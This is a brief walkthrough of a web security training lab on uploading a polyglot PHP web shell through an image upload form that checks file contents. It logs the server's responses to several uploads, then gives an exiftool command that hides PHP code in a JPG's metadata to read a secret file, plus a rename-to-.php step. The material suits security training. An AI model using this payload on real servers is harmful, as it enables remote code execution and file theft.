### Lab: Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function.
Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.
Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


Web-Server behavior:

1) Upload file.png (1kb) ===> Error: file is not a valid image Sorry, there was an error uploading your file.
2) Upload file.jpg (1kb) ===> Error: file is not a valid image Sorry, there was an error uploading your file.
3) Upload dog.jpg (35kb) ===> The file avatars/dog.jpg has been uploaded. (Path: /files/avatars/dog.jpg)



Exploit:
1) PHP injection in legit JPG file via exitftool (**exiftool -DocumentName="<?php echo file_get_contents('/home/carlos/secret');__halt_compiler();?> [IMAGE FILE]**")  
    1a) Rename injected file *.jpg into *.php ===> The file avatars/dog_php_injected.php has been uploaded.
